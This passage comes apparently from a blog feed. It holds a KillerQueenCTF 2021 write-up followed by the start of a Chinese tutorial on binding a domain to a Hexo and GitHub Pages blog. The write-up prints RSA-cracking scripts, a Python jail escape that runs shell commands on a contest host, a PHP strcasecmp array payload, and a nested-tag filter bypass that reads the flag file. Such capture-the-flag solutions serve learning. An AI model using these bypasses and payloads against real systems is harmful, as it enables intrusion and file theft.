        <tag>K3RN3LCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>KillerQueenCTF2021 Writeup</title>
    <url>/posts/2621990551/</url>
    <content><![CDATA[<h1 id="Cloudsourcing"><a href="#Cloudsourcing" class="headerlink" title="Cloudsourcing"></a>Cloudsourcing</h1><p><em>Sourced in the cloud</em></p>
<hr>
<p>ä½¿ç”¨<a href="https://github.com/Ganapati/RsaCtfTool">RsaCtfTool</a>ç ´è§£å…¬é’¥,å°†å¾—åˆ°çš„ç§é’¥ä¿å­˜è‡³<code>a.pem</code></p>
<pre><code class="shell">~$ python RsaCtfTool.py --publickey cloudsourcing/key.pub --private
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAzTf73VQrgsjh5aRpcE1waspEO5B48ZgjIfZyloCzR5cC2Rc1
e+YwvI/2hNPuageLgmjOqk6FLO3dxa2kemzH2EBG+n7RHlxIe4z6hobXCkXM4Sd4
O7NvHlkebe5ULoOvpJxs5f7LB4zNffl49MLVRmGJOWI33LVPi86VQg53U5nVCUTn
dmqWJsnjf06aeNJb0htFA1oy7eA9GaaNyBZC7recU+pj5CJmnlitxaSaLLTahi7m
lW92j4LDnDnIODhEtxqmWA3sMLoMGGwlve1+cXd4+r1ovhkBWmkBR5/lp/p2KQLs
pet5HzDZgAlvQzA0Cw2q6B2mt33hgVb7JfT8WQIDAQABAoIBADrihoWyoi2L4K3Z
KFwODGTIFx4UTW/dXK9hHO4sjcTMAwgxzan4miFxGaZxfWa1NYW89xgNIc+LjWgs
dBag4hMeFn/IJc8VYcL55+T0Cf4rmyc8ARb4XLkTj1Sx3zvdk2ejbufr3WwULd6o
19k7kqD4Wby6fxb4e5O9OjzTE9BLvr1NpHN1QRUupSUX3kv/mhtO3gQrRrkAT1L2
Ais+piqHmSrtX6YAnjood9oW2qy6oyBWvA11ipY9ZqfpI2G5Qc9WtViH/Erz2/3S
wFf0J9pgn+iAPbhcGwVh6U/cF+BcQZGse9GaY5Us4SJaQmM0ZdKiYbhKTRGBkudH
60sqeDUCgYEA0mwnrjcDpoc5Kv7qMB4AQCwP6LKnaG5q8Tc86JzYaPEnfUzl4trO
TruiSXmsok8RM/OLdAiIYiazz3GWgxFVNGtv+cEk4AKQnu2iRg5kP4wKBzqhYCnT
gMMMnt2UQfUrPOX7WDHaqQaOxkF06GJeHY7/RMswdOlXWx3w4oo2LJMCgYEA+atH
z0eS+0wzV4lubfpNl/6gi6KJxnpoPJtDt2vJBAa24fbS6ox9bx+Riki/CkpWiGDs
mb2ha1j5580kzDLfJjt1rncCd1iJy+S8zXmX0I1lkmhCnGKjsDDP4nqGmWoHyc9U
HxBYPWd2RtKNcBVDLImxr9IGe74GArU0Q2TmcuMCgYAvtwDEe4sjXvRysH1QTe1G
n/c3kBNwFeHAMwNnx/E20sBepGpYp78ykU+6k5G2+HDxM9/CfxDWGOqbNqmnrO2C
Rn6MxuRiu5Ipx78NXcQTuOCpRP1E/hcM0q3w9FPjJQIZ/BijpiJsQ6VqhXtKGsw2
ra9q3Rxu1l7NtZti825XawKBgHMG2LTE8xDYUKc56Ci/M1SduXXb0sIgzzltB0vQ
WvKB7Ww5/X6Wb4vs7W7aiTnCeg+nKBrE5UPB4JFNUHDL10eUCWnx5q75mbLYlavN
I4awPmWvp1DJmUSpmH1tmenAkgoGfWk6bI0Nx85lX0iOYz53yeeJSfdk2vwQZB3Q
tOOlAoGBAM83orP3tq+o57yvX/v36APtNW7ja7fMnSnmZRuWyJDqCJMNvGRlGObt
hfLludqNeJ4BSJ1nZNqbIvukk8J7DDukrGE5WxP+L1UmuIcTLgOeW7heMEUFbuVG
SpUX47+QBmx6Q8mHa97x/sGidZMlOEBG38bhvfdMgX0pW8zO+Oll
-----END RSA PRIVATE KEY-----
</code></pre>
<p>ç¼–å†™ä»£ç ,ç”¨RSAè§£å¯†</p>
<pre><code class="python">from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5 as PKCS1_cipher
import base64
c = &#39;Oz5cG3uh6HGoPTsM9yERR2senJ+flkD9dikgzIDimT7xvguYEHGCMvYiD5F5dwbDIlvM7SqYxbzsx5L7+Kfg5OkvrJOMdc7tEsQK7L4n4QSN2mhxVP0AjxpHgufob+MfvL7/36grb6taeW8l5uLUveZ3aPK/XJt35znPScCxTLShFGj0xc/aCxRZYV+oNT6ygyPV4RSGh8v/yeY9bY1wIjYfQLqufKeogcsdBtBXTYQGCX+JQo9NVBLNkU7zQLT+AKit68HkTsORXhjNBFqvj4hQs3jB4rfUt54MKoDDuK0BFrfACKJIQe2LpmBtrVznlyfygIBfmFwrdkHRDi9bdA==&#39;

with open(&#39;a.pem&#39;,&#39;r&#39;) as f:
    pri_key = RSA.importKey(f.read())
    cipher = PKCS1_cipher.new(pri_key)
    plain = cipher.decrypt(base64.b64decode(c), 0)
    print(plain)
</code></pre>
<p><strong>flag:</strong><code>kqctf&#123;y0uv3_6r4du473d_fr0m_r54_m1ddl3_5ch00l_abe7e79e244a9686efc0&#125;</code></p>
<h1 id="Road-Safety-Association"><a href="#Road-Safety-Association" class="headerlink" title="Road_Safety_Association"></a>Road_Safety_Association</h1><p><em>That&#39;s what it stands for, right?</em></p>
<hr>
<p>é¢˜ç›®ç»™äº†c,p,q,eçš„å€¼,ç›´æ¥æ±‚dè§£å¯†å³å¯<br>ä»£ç :</p>
<pre><code class="python">import gmpy2
from Crypto.Util.number import long_to_bytes

c = 34709089913401150635163820358938916881993556790698827096314474131695180194656373592831158701400832173951061153349955626770351918715134102729180082310540500929299260384727841272328651482716425284903562937949838801126975821205390573428889205747236795476232421245684253455346750459684786949905537837807616524618
p = 7049378199874518503065880299491083072359644394572493724131509322075604915964637314839516681795279921095822776593514545854149110798068329888153907702700969
q = 11332855855499101423426736341398808093169269495239972781080892932533129603046914334311158344125602053367004567763440106361963142912346338848213535638676857
e = 65537

n = p * q
phi = (p-1) * (q-1)
d = gmpy2.invert(e, phi)
x = pow(c, d, n)
print(x)
print(long_to_bytes(x))
</code></pre>
<p><strong>flag:</strong><code>kqctf&#123;y0uv3_6r4du473d_fr0m_r54_3l3m3n74ry_5ch00l_ac8770bdcebc&#125;</code></p>
<h1 id="Hammer-To-Fall"><a href="#Hammer-To-Fall" class="headerlink" title="Hammer To Fall"></a>Hammer To Fall</h1><p><em>Dynamically sized integers huh (wrap the proper input in a flag wrapper kqctf{number})</em></p>
<hr>
<p>æºæ–‡ä»¶:</p>
<pre><code class="python">import numpy as np

a = np.array([0], dtype=int)
val = int(input(&quot;This hammer hits so hard it creates negative matter\n&quot;))
if val == -1:
    exit()
a[0] = val
a[0] = (a[0] * 7) + 1
print(a[0])
if a[0] == -1:
    print(&quot;flag!&quot;)
</code></pre>
<p><code>NumPy</code>ä¸­çš„intä½¿ç”¨çš„æ˜¯Cä¸­çš„long,å‚ç…§<a href="https://numpy.org/doc/stable/reference/arrays.scalars.html#numpy.int_">NumPyæ–‡æ¡£</a>,æœ€å¤§å€¼ä¸º9223372036854775807</p>
<pre><code class="python">&gt;&gt;&gt; 9223372036854775807 // 7 * 2
2635249153387078802
</code></pre>
<p><strong>flag:</strong><code>kqctf&#123;2635249153387078802&#125;</code></p>
<h1 id="I-want-to-break-free"><a href="#I-want-to-break-free" class="headerlink" title="I want to break free"></a>I want to break free</h1><p><em>I want to break free... from this Python jail. nc 143.198.184.186 45457</em></p>
<hr>
<p>ä½¿ç”¨<code>&#39;o&#39;+&#39;s&#39;</code>ç»•è¿‡å¯¹osçš„è¿‡æ»¤,æ‰§è¡Œlså‘½ä»¤,å‘ç°å­˜åœ¨æ–‡ä»¶<code>cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt</code></p>
<pre><code class="shell">~$ nc 143.198.184.186 45457

    You are in jail. Can you escape?

&gt; __builtins__.__import__(&#39;o&#39;+&#39;s&#39;).system(&#39;ls&#39;)
bin
blacklist.txt
boot
cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt
dev
etc
home
jail.py
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
None
</code></pre>
<p>è¯»å–æ–‡ä»¶å†…å®¹</p>
<pre><code class="shell">&gt; print(__builtins__.open(&#39;cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt&#39;).read())
kqctf&#123;0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc&#125;

None
</code></pre>
<p><strong>flag:</strong><code>kqctf&#123;0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc&#125;</code></p>
<h1 id="sneeki-snek"><a href="#sneeki-snek" class="headerlink" title="sneeki snek"></a>sneeki snek</h1><p><em>ssssssssssssssssssssssssssssssssssssss</em></p>
<hr>
<p>æ ¹æ®å­—èŠ‚ç è¿˜åŸæ–‡ä»¶:</p>
<pre><code class="python">f = &#39;&#39;
a = &#39;rwhxi&#125;eomr\\^`Y&#39;
z = &#39;f]XdThbQd^TYL&amp;\x13g&#39;
a = a + z
for i,b in enumerate(a):
    c = ord(b)
    c = c - 7
    c = c+i
    f += chr(c)

print(f)
</code></pre>
<p><strong>flag:</strong><code>kqctf&#123;dont_be_mean_to_snek_:(&#125;</code></p>
<h1 id="sneeki-snek-2-oh-no-what-did-i-do"><a href="#sneeki-snek-2-oh-no-what-did-i-do" class="headerlink" title="sneeki snek 2 oh no what did i do"></a>sneeki snek 2 oh no what did i do</h1><p><em>did snek steal your pasta because this is some spaghetti</em></p>
<hr>
<p>æ ¹æ®å­—èŠ‚ç è¿˜åŸæ–‡ä»¶:</p>
<pre><code class="python">a = list()
a.append(1739411)
a.append(1762811)
a.append(1794011)
a.append(1039911)
a.append(1061211)
a.append(1718321)
a.append(1773911)
a.append(1006611)
a.append(1516111)
a.append(1739411)
a.append(1582801)
a.append(1506121)
a.append(1783901)
a.append(1783901)
a.append(1773911)
a.append(1582801)
a.append(1006611)
a.append(1561711)
a.append(1039911)
a.append(1582801)
a.append(1773911)
a.append(1561711)
a.append(1582801)
a.append(1773911)
a.append(1006611)
a.append(1516111)
a.append(1516111)
a.append(1739411)
a.append(1728311)
a.append(1539421)

b = &#39;&#39;
for i in a:
    c = str(i)
    c=c[::-1]
    c= c[:-1]
    c = int(c)
    c = 5 ^ c
    c= c - 55555
    c = c // 555
    b = b + chr(c)
print(b)
</code></pre>
<p><strong>flag:</strong><code>kqctf&#123;snek_waas_not_so_sneeki&#125;</code></p>
<h1 id="Just-Not-My-Type"><a href="#Just-Not-My-Type" class="headerlink" title="Just Not My Type"></a>Just Not My Type</h1><p><em>I really don&#39;t think we&#39;re compatible (<a href="http://143.198.184.186:7000/">Link</a>)</em></p>
<hr>
<p>æºæ–‡ä»¶:</p>
<pre><code class="php+HTML">&lt;h1&gt;I just don&#39;t think we&#39;re compatible&lt;/h1&gt;
&lt;?php
$FLAG = &quot;shhhh you don&#39;t get to see this locally&quot;;
if ($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;POST&#39;) 
&#123;
    $password = $_POST[&quot;password&quot;];
    if (strcasecmp($password, $FLAG) == 0) &#123;
        echo $FLAG;
    &#125; 
    else &#123;
        echo &quot;That&#39;s the wrong password!&quot;;
    &#125;
&#125;
?&gt;
&lt;form method=&quot;POST&quot;&gt;
    Password
    &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;
    &lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
</code></pre>
<p><strong>Payload</strong></p>
<pre><code class="php+HTML">password[]=123
</code></pre>
<p><strong>flag:</strong><code>flag&#123;no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible&#125;</code></p>
<h1 id="PHat-Pottomed-Girls"><a href="#PHat-Pottomed-Girls" class="headerlink" title="PHat Pottomed Girls"></a>PHat Pottomed Girls</h1><p><em>Now it&#39;s attempt number 3 and this time with a Queen reference! (flag is in the root directory)</em></p>
<hr>
<p>æºæ–‡ä»¶:</p>
<pre><code class="php+HTML">&lt;?php
session_start();

function generateRandomString($length = 15) &#123;
    $characters = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;;
    $charactersLength = strlen($characters);
    $randomString = &#39;&#39;;
    for ($i = 0; $i &lt; $length; $i++) &#123;
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    &#125;
    return $randomString;
&#125;
function filter($originalstring) &#123;
    $notetoadd = str_replace(&quot;&lt;?php&quot;, &quot;&quot;, $originalstring);
    $notetoadd = str_replace(&quot;?&gt;&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;&lt;?&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;flag&quot;, &quot;&quot;, $notetoadd);

    $notetoadd = str_replace(&quot;fopen&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;fread&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;file_get_contents&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;fgets&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;cat&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;strings&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;less&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;more&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;head&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;tail&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;dd&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;cut&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;grep&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;tac&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;awk&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;sed&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;read&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;system&quot;, &quot;&quot;, $notetoadd);

    return $notetoadd;
&#125;

if(isset($_POST[&quot;notewrite&quot;])) &#123;
    $newnote = $_POST[&quot;notewrite&quot;];

    //3rd times the charm and I&#39;ve learned my lesson. Now I&#39;ll make sure to filter more than once :)
    $notetoadd = filter($newnote);
    $notetoadd = filter($notetoadd);
    $notetoadd = filter($notetoadd);

    $filename = generateRandomString();
    array_push($_SESSION[&quot;notes&quot;], &quot;$filename.php&quot;);
    file_put_contents(&quot;$filename.php&quot;, $notetoadd);
    header(&quot;location:index.php&quot;);
&#125;
</code></pre>
<p><strong>Payload</strong></p>
<pre><code class="php+HTML">&lt;&lt;&lt;&lt;&lt;&lt;&lt;?php??php??php??php
 echo `sort /fffflaglaglaglag.php`;
????&gt;&gt;&gt;&gt;
</code></pre>
<p><strong>flag:</strong><code>flag&#123;wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>KillerQueenCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo+Github pagesåšå®¢ç»‘å®šä¸­æ–‡åŸŸå</title>
    <url>/posts/24787/</url>
    <content><![CDATA[<h2 id="æ‘˜è¦"><a href="#æ‘˜è¦" class="headerlink" title="æ‘˜è¦"></a>æ‘˜è¦</h2><p>è¿‘æœŸåˆå¼€å§‹äº†hexoçš„æŠ˜è…¾ï¼Œåœ¨é˜¿é‡Œäº‘ä¸Šä¹°äº†ä¸€ä¸ªå±äºè‡ªå·±çš„åŸŸåï¼Œå› æ­¤æƒ³ç€æŠŠè‡ªå·±ç”¨hexo+Githubæ­å»ºçš„åšå®¢é€šè¿‡åŸŸåè®¿é—®ï¼Œäºæ˜¯æŒ‰ç…§ç™¾åº¦ä¸Šçš„æ•™ç¨‹ä¸€æ­¥ä¸€æ­¥æ¥ç»‘å®šåŸŸåï¼Œç»“æœå‡ºç°äº†å¾ˆå¤šé—®é¢˜ ã€‚æ•´ä¸ªè¿‡ç¨‹å¯è°“ä¸€æ³¢ä¸‰æŠ˜ï¼Œç»ˆäºå®ç°äº†é€šè¿‡åŸŸåæ¥è®¿é—®åšå®¢ï¼Œä¸‹é¢ç®€è¦ä»‹ç»ä¸€ä¸‹æˆ‘ç»‘å®šåŸŸåè¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜ä»¥åŠè§£å†³æ–¹æ¡ˆã€‚</p>
<span id="more"></span>
<h2 id="è´­ä¹°åŸŸå"><a href="#è´­ä¹°åŸŸå" class="headerlink" title="è´­ä¹°åŸŸå"></a>è´­ä¹°åŸŸå</h2><p>è¿™é‡Œä»¥åœ¨<a href="https://www.aliyun.com/">é˜¿é‡Œäº‘</a>ä¸Šè´­ä¹°åŸŸåä¸ºä¾‹,å¤§å®¶ä¹Ÿå¯ä»¥å»å…¶ä»–å¹³å°è´­ä¹°åŸŸåã€‚<br>ç™»å½•é˜¿é‡Œäº‘ï¼Œç‚¹å‡»<strong>äº§å“</strong>ï¼Œé€‰æ‹©<strong>åŸŸåæ³¨å†Œ</strong>ã€‚<br>æ³¨å†ŒåŸŸåå‰éœ€æŸ¥è¯¢åŸŸåæ˜¯å¦å·²è¢«æ³¨å†Œï¼Œé€‰æ‹©è‡ªå·±å–œæ¬¢çš„åŸŸåï¼Œæ”¯ä»˜å³å¯ã€‚<br><img data-src="/images/20180213014855.jpg"><br>ä¸€èˆ¬æ¥è¯´ï¼Œ.topä¸.xyzç»“å°¾çš„åŸŸåéƒ½æ¯”è¾ƒä¾¿å®œã€‚ä¸ºäº†èŠ‚çº¦æˆæœ¬ï¼Œæˆ‘ä¹°çš„.topç»“å°¾çš„åŸŸåï¼Œä¸€å¹´åªéœ€ä¸¤å—é’±ï¼Œå¾ˆä¾¿å®œã€‚</p>
<h2 id="åŸŸåè§£æ"><a href="#åŸŸåè§£æ" class="headerlink" title="åŸŸåè§£æ"></a>åŸŸåè§£æ</h2><p>è´­ä¹°åŸŸååï¼Œæˆ‘ä»¬ä¾æ¬¡ç‚¹å‡»ä¸ªäººæ˜µç§°-&gt;åŸŸåä¸ç½‘ç«™(ä¸‡ç½‘)-&gt;åŸŸåï¼Œè¿›å…¥ç®¡ç†æ§åˆ¶å°ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è‡ªå·±è´­ä¹°çš„åŸŸå,ç‚¹å‡»<strong>è§£æ</strong>ï¼Œè¿›å…¥è§£æè®¾ç½®ã€‚<br><img data-src="/images/20180212235815.jpg"><br>ç‚¹å‡»æ·»åŠ è§£æï¼Œä¾æ¬¡è¾“å…¥ï¼š<strong>CNAMEã€@ã€Githubåšå®¢åœ°å€</strong>ï¼Œç‚¹å‡»<strong>ç¡®å®š</strong>ï¼Œå®Œæˆä¸ªäººåŸŸåå‘ä¸ªäººåšå®¢çš„æ˜ å°„ã€‚<br><img data-src="/images/20180212230359.jpg"></p>
<div class="note warning"><p>æ³¨æ„ï¼šè¿™é‡Œå¡«å…¥åšå®¢åœ°å€çš„æ—¶å€™æ— éœ€å¡«å†™https:// ï¼Œåªéœ€æŒ‰ç…§example.github.ioæ ¼å¼å¡«å†™å°±è¡Œäº†ã€‚
</p></div>

<h2 id="åˆ›å»ºCNAMEæ–‡ä»¶"><a href="#åˆ›å»ºCNAMEæ–‡ä»¶" class="headerlink" title="åˆ›å»ºCNAMEæ–‡ä»¶"></a>åˆ›å»ºCNAMEæ–‡ä»¶</h2><p>åœ¨æœ¬åœ°çš„æ ¹ç›®å½•ä¸‹çš„sourceæ–‡ä»¶å¤¹ä¸­æ–°å»ºä¸€ä¸ªåä¸º<strong>CNAME</strong>çš„æ–‡æœ¬æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ä¸º<strong>ä¸ªäººåŸŸå</strong>ï¼ˆæ²¡æœ‰http:&#x2F;&#x2F; ,ä¹Ÿæ²¡æœ‰www.ï¼‰,ç„¶åé‡å‘½ååˆ é™¤è¯¥æ–‡ä»¶çš„åç¼€å:<strong>.txt</strong>ã€‚<br>ä½¿ç”¨<code>hexo d -g</code>å‘½ä»¤éƒ¨ç½²åšå®¢ï¼Œè¿™æ—¶åœ¨æµè§ˆå™¨ä¸­è¾“å…¥æ–°æ³¨å†Œçš„åŸŸåï¼Œå·²ç»å¯ä»¥æ­£å¸¸çš„è®¿é—®åšå®¢äº†ã€‚</p>
<h3 id="è‹±æ–‡åŸŸå"><a href="#è‹±æ–‡åŸŸå" class="headerlink" title="è‹±æ–‡åŸŸå"></a>è‹±æ–‡åŸŸå</h3><p>è‹±æ–‡åŸŸåå°±ç›´æ¥å†™:<code>example.con</code></p>
<h3 id="ä¸­æ–‡åŸŸå"><a href="#ä¸­æ–‡åŸŸå" class="headerlink" title="ä¸­æ–‡åŸŸå"></a>ä¸­æ–‡åŸŸå</h3><p>ä¸­æ–‡åŸŸåçš„è¯,åˆ™éœ€å…ˆå°†ä¸­æ–‡åŸŸåè½¬æ¢ä¸º<strong>Punycodeæ ‡å‡†ç¼–ç çš„å­—ç¬¦ä¸²</strong>:<a href="http://www.dh.vg/tools/zm.php">ä¸­æ–‡åŸŸåè½¬æ¢Punycodeæ ‡å‡†ç¼–ç å·¥å…·</a><br>For example:<br><code>ä¾‹å­.ä¸­æ–‡</code>ç»è¿‡è½¬æ¢ä¸º<code>xn--fsqu00a.xn--fiq228c</code><br>å°†<code>xn--****.xn--***</code>å¡«å…¥<strong>CNAME</strong>æ–‡ä»¶å³å¯ã€‚</p>
<div class="note danger"><p>å¦‚æœç›´æ¥åœ¨CNAMEæ–‡ä»¶ä¸­å¡«å†™ä¸­æ–‡åŸŸå,åˆ™Githubä¼šé€šè¿‡é‚®ä»¶æé†’ä½ :
The CNAME xxx.com is not properly formatted. See https://help.github.com/articles/troubleshooting-custom-domains/#github-repository-setup-errors for more information.
</p></div>
## LeanCloudæ•°æ®ä¸¢å¤±
é€šè¿‡åŸŸåè®¿é—®åšå®¢ï¼Œå‘ç°æ–‡ç« çš„é˜…è¯»æ¬¡æ•°ä¸æ˜¾ç¤ºï¼Œäºæ˜¯å„ç§æŠ˜è…¾ï¼šæ£€æŸ¥å…ƒç´ ã€è°·æ­Œï¼Œæœ€åå‘ç°æ˜¯ç”±äºæ²¡æœ‰å°†æ–°æ³¨å†Œçš„åŸŸååŠ å…¥åˆ°LeanCloudè®¾ç½®ä¸­çš„**Web å®‰å…¨åŸŸå**,å¯¼è‡´æ— æ³•è°ƒç”¨æœåŠ¡å™¨èµ„æºã€‚
è§£å†³æ–¹æ¡ˆï¼šè®¿é—®ï¼š[LeanCloudå®˜ç½‘](https://leancloud.cn),è¿›å…¥**æ§åˆ¶å°**ï¼Œåœ¨è®¾ç½®ä¸­ç‚¹å‡»**å®‰å…¨ä¸­å¿ƒ**ï¼Œå°†æ–°æ³¨å†Œçš„åŸŸååŠ å…¥åˆ°**Webå®‰å…¨åŸŸå**ä¸­ï¼Œç‚¹å‡»**ä¿å­˜**å³å¯ã€‚
![](/images/20180213013700.jpg)

<h2 id="busuanziæ•°æ®ä¸¢å¤±"><a href="#busuanziæ•°æ®ä¸¢å¤±" class="headerlink" title="busuanziæ•°æ®ä¸¢å¤±"></a>busuanziæ•°æ®ä¸¢å¤±</h2><p>æ— è®ºæ˜¯é€šè¿‡åŸŸåè¿˜æ˜¯githubåœ°å€è®¿é—®åšå®¢ï¼Œåšå®¢åº•éƒ¨çš„ç»Ÿè®¡æµè§ˆé‡ä¸æµè§ˆäººæ¬¡å‡ä¸æ˜¯ä»¥å‰çš„æ•°æ®ï¼Œè€Œæ˜¯ä»å¤´å¼€å§‹è®¡ç®—....<br>busuanziè¿˜ä¸å…·å¤‡ç»Ÿåˆå§‹å€¼çš„åŠŸèƒ½ï¼Œåªèƒ½ä»å¤´å¼€å§‹è®¡ç®—äº†ã€‚ã€‚ã€‚</p>
<h2 id="æ‹“å±•"><a href="#æ‹“å±•" class="headerlink" title="æ‹“å±•"></a>æ‹“å±•</h2><h3 id="ä¸­æ–‡åŸŸå-1"><a href="#ä¸­æ–‡åŸŸå-1" class="headerlink" title="ä¸­æ–‡åŸŸå"></a>ä¸­æ–‡åŸŸå</h3><p>ï¼‘ã€ä¸€ç±»æ˜¯åŸŸååç¼€ä¸ºè‹±æ–‡å­—æ¯çš„å›½é™…ä¸­æ–‡åŸŸåå’Œåˆ«å›½ä¸­æ–‡åŸŸåï¼Œæ¯”å¦‚ï¼šä¸­æ–‡.comï¼Œä¸­æ–‡.netï¼Œä¸­æ–‡.bizï¼Œä¸­æ–‡.ccï¼Œä¸­æ–‡.hkï¼Œä¸­æ–‡.tmï¼Œä¸­æ–‡.tvï¼Œä¸­æ–‡.twï¼›<br>ï¼’ã€ä¸€ç±»æ˜¯åŸŸååç¼€ä¸ºä¸­æ–‡çš„çº¯ä¸­æ–‡å›½å†…ä¸­æ–‡åŸŸåï¼Œæ¯”å¦‚ï¼šä¸­æ–‡åŸŸå.ä¸­å›½ï¼Œä¸­æ–‡åŸŸå.å…¬å¸ï¼Œä¸­æ–‡åŸŸå.ç½‘ç»œï¼›<br>ä¸­æ–‡åŸŸååœ¨è§£æçš„æ—¶å€™ï¼Œéœ€è¦å…ˆè½¬æ¢ä¸º xn--fiq228c.comæˆ–xn--fiq228c.cnå½¢å¼çš„ASCIIç ï¼Œè¿™ç§ç¼–ç ç§°ä¸ºPunyCodeã€‚çº¯ä¸­æ–‡åŸŸåä¸è¢«æ ‡å‡†çš„è§£ææœåŠ¡å™¨æ”¯æŒï¼Œè¦å®ç°å¯¹è¿™ç§çº¯ä¸­æ–‡åŸŸåçš„æ­£ç¡®è®¿é—®ï¼ŒISPéœ€è¦åšç›¸åº”çš„ä¿®æ”¹ï¼Œä»¥ä¾¿èƒ½å¤Ÿæ­£ç¡®è§£æä¸­æ–‡åŸŸåã€‚åŒæ—¶CNNICä¹Ÿæä¾›äº†ä¸“ç”¨æœåŠ¡å™¨ï¼Œç”¨æˆ·åªè¦å°†æµè§ˆå™¨çš„DNSè®¾ç½®æŒ‡å‘è¿™å°æœåŠ¡å™¨ï¼Œå®ƒåŒæ ·å¯ä»¥å®Œæˆå¯¹çº¯ä¸­æ–‡åŸŸåçš„æ­£ç¡®è§£æã€‚å¦å¤–ï¼Œè€ƒè™‘åˆ°ç°åœ¨æœ‰äº›ISPè¿˜æ²¡æœ‰åšä¿®æ”¹ï¼Œè€Œæœ‰äº›ç”¨æˆ·åˆä¸æ–¹ä¾¿å°†DNSè®¾ç½®æŒ‡å‘CNNICæä¾›çš„æœåŠ¡å™¨ï¼Œçº¯ä¸­æ–‡åŸŸåä¼šè¢«åŠ ä¸Š.cnåç¼€ï¼Œå³å¯¹æ¯ä¸€ä¸ªçº¯ä¸­æ–‡åŸŸååŒæ—¶æœ‰ä¸¤ç§å½¢å¼ï¼šçº¯ä¸­æ–‡åŸŸåå’Œçº¯ä¸­æ–‡åŸŸå.CNï¼Œ å¦‚ï¼š&quot;ä¸­æ–‡åŸŸå.ç½‘ç»œ&quot;å’Œ&quot;ä¸­æ–‡åŸŸå.ç½‘ç»œ.CN&quot;ã€‚è¿™æ ·å³ä½¿ISPè¿˜æ²¡æœ‰åšç›¸åº”çš„ä¿®æ”¹ï¼Œç”¨æˆ·ä¹Ÿå¯ä»¥æ­£ç¡®ä½¿ç”¨ä¸­æ–‡åŸŸåã€‚</p>
<h3 id="PunyCode"><a href="#PunyCode" class="headerlink" title="PunyCode"></a>PunyCode</h3><p>è‹±æ–‡åŸŸååœ¨IISæˆ–Apacheä¸­çš„è™šæ‹Ÿä¸»æœºè®¾ç½®ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨è‹±æ–‡åŸŸåï¼Œå¦‚webmasterhome.cnã€‚<br>ä¸­æ–‡åŸŸååœ¨IISæˆ–Apacheä¸­åº”å¦‚ä½•è®¾ç½®ä¸»æœºå¤´å‘¢ï¼Ÿå¦‚&quot;ä¸­å›½ç«™é•¿ä¹‹å®¶.com&quot;ã€‚<br>1ã€åœ¨è¿›è¡Œè®¾ç½®ä¹‹å‰è¦å…ˆæŠŠä¸­æ–‡åŸŸåè½¬åŒ–æˆä¸ºPunyCodeç¼–ç ï¼Œç„¶ååœ¨ä¸»æœºå¤´è®¾ç½®é‡Œé¢å¡«ä¸Šä¸­æ–‡åŸŸåæ‰€å¯¹åº”çš„PunyCodeç¼–ç (ï½€xn--fiqsC146Ah4ex80Cro7A.comï½€)ä¾¿å¯ã€‚<br>æ–°çš„å›½é™…åŒ–åŸŸåçš„æ ‡å‡†åœ¨ç½‘åŸŸåç§°ç¼–ç ä¸Šï¼Œä¸ºäº†ä¿ç•™å‘ä¸‹å…¼å®¹æ€§åŠä¸å½±å“ç°æœ‰çš„åº”ç”¨ç¨‹åºåè®®ï¼Œå› æ­¤å°†å¤šå›½è¯­è¨€åŸŸåè½¬æˆASCIIç¼–ç ï¼Œè€Œè¿™ç§ç¼–ç ç§°ä¸ºã€punycodeã€ã€‚<br>å› ä¸ºç»è¿‡Nameprepå¤„ç†è¿‡çš„å›½é™…åŒ–åŸŸåæ˜¯ä»¥ Unicode åºåˆ—çš„å½¢å¼è¡¨ç¤ºçš„ã€‚ä½†ç°æœ‰çš„ DNSç³»ç»Ÿåªæ”¯æŒç”¨ 